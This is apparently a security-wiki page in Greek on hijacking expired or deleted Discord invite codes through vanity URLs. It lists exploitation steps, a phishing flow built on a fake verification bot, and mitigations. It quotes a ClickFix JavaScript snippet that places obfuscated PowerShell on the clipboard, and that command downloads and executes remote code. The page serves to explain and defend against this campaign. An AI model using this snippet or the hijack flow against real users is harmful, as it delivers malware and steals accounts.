# Discord Invite Hijacking

Το Discord invite hijacking εκμεταλλεύεται τους κανόνες επαναχρησιμοποίησης των custom vanity links: ένας ληγμένος temporary invite code ή ένας διαγραμμένος permanent code που αποτελείται μόνο από πεζά γράμματα και ψηφία μπορεί να καταχωριστεί ως vanity link σε server με Level 3 Boost. Ένα custom vanity link μπορεί επίσης να γίνει διαθέσιμο όταν ο αρχικός server χάσει το Level 3 Boost του· για έναν temporary invite που περιέχει κεφαλαία γράμματα, ένας attacker μπορεί να προεγγράψει τη vanity μορφή με πεζά γράμματα ενώ το κανονικό invite παραμένει ενεργό, όμως η ανακατεύθυνση ξεκινά μόνο αφού λήξει το συγκεκριμένο invite.<sup>[[1]](#references)[[2]](#references)</sup>

## Invite Types and Hijack Risk

Ο παρατηρούμενος κίνδυνος διαφέρει ανάλογα με τον τύπο του invite:<sup>[[1]](#references)[[2]](#references)</sup>

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | Μετά τη λήξη του, ο code γίνεται διαθέσιμος και μπορεί να επανακαταχωριστεί ως vanity URL από έναν boosted server. |
| Permanent Invite Link | ⚠️          | Αν διαγραφεί και αποτελείται μόνο από πεζά γράμματα και ψηφία, ο code μπορεί να γίνει ξανά διαθέσιμος.        |
| Custom Vanity Link    | ✅          | Αν ο αρχικός server χάσει το Level 3 Boost του, το vanity invite γίνεται διαθέσιμο για νέα καταχώριση.    |

## Exploitation Steps

1. Reconnaissance
- Παρακολούθηση public sources (forums, social media, Telegram channels) για invite links που ταιριάζουν στο μοτίβο `discord.gg/{code}` ή `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Συλλογή invite codes που παρουσιάζουν ενδιαφέρον (temporary ή vanity).<sup>[[1]](#references)</sup>
2. Pre-registration
- Δημιουργία ή χρήση υπάρχοντος Discord server με δικαιώματα Level 3 Boost.<sup>[[1]](#references)[[2]](#references)</sup>
- Στο **Server Settings → Vanity URL**, προσπάθεια εκχώρησης του target invite code. Αν γίνει αποδεκτός, ο code δεσμεύεται από τον malicious server.<sup>[[1]](#references)</sup>
3. Hijack Activation
- Για temporary invites, αναμονή μέχρι να λήξει το αρχικό invite (ή χειροκίνητη διαγραφή του, αν ελέγχετε την πηγή).<sup>[[1]](#references)</sup>
- Για codes που περιέχουν κεφαλαία γράμματα, η παραλλαγή με πεζά γράμματα μπορεί να γίνει claim αμέσως, αν και η ανακατεύθυνση ενεργοποιείται μόνο μετά τη λήξη.<sup>[[1]](#references)</sup>
4. Silent Redirection
- Οι χρήστες που επισκέπτονται το παλιό link μεταφέρονται απρόσκοπτα στον server που ελέγχει ο attacker μόλις ενεργοποιηθεί το hijack.<sup>[[1]](#references)</sup>

## Phishing Flow via Discord Server

1. Περιορισμός των καναλιών του server, ώστε να είναι ορατό μόνο ένα **#verify** channel.<sup>[[1]](#references)</sup>
2. Ανάπτυξη ενός bot (π.χ. **Safeguard#0786**) για να ζητά από τους νέους χρήστες να κάνουν verify μέσω OAuth2.<sup>[[1]](#references)</sup>
3. Το bot ανακατευθύνει τους χρήστες σε phishing site (π.χ. `captchaguard.me`) με πρόσχημα ένα CAPTCHA ή ένα βήμα verification.<sup>[[1]](#references)</sup>
4. Υλοποίηση του **ClickFix** UX trick:<sup>[[1]](#references)</sup>
- Εμφάνιση μηνύματος για broken CAPTCHA.
- Καθοδήγηση των χρηστών να ανοίξουν το παράθυρο **Win+R**, να κάνουν paste μια προφορτωμένη εντολή PowerShell και να πατήσουν Enter.

### ClickFix Clipboard Injection Example

Η campaign χρησιμοποίησε JavaScript για να αντιγράψει μια malicious εντολή PowerShell στο clipboard:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Αυτή η προσέγγιση αποφεύγει τις άμεσες λήψεις αρχείων και αξιοποιεί οικεία στοιχεία UI για να μειώσει την υποψία των χρηστών.<sup>[[1]](#references)</sup>

## Mitigations

- Προτιμάτε μόνιμα invite links και βεβαιωθείτε ότι ο κωδικός περιέχει τουλάχιστον ένα κεφαλαίο γράμμα· οι διαγραμμένοι μόνιμοι κωδικοί που περιέχουν κεφαλαία γράμματα δεν μπορούν να επαναχρησιμοποιηθούν ως vanity links.<sup>[[1]](#references)</sup>
- Περιστρέφετε τακτικά τους κωδικούς invite και ανακαλείτε τα παλιά links.
- Παρακολουθείτε την κατάσταση server boost του Discord και τις διεκδικήσεις vanity URL.<sup>[[1]](#references)[[2]](#references)</sup>
- Εκπαιδεύετε τους χρήστες να επαληθεύουν τη γνησιότητα του server και να αποφεύγουν την εκτέλεση εντολών που έχουν γίνει paste από το clipboard.

## References

- [1] [Από την εμπιστοσύνη στην απειλή: Hijacked Discord Invites χρησιμοποιούνται για Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Υποστήριξη Discord](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
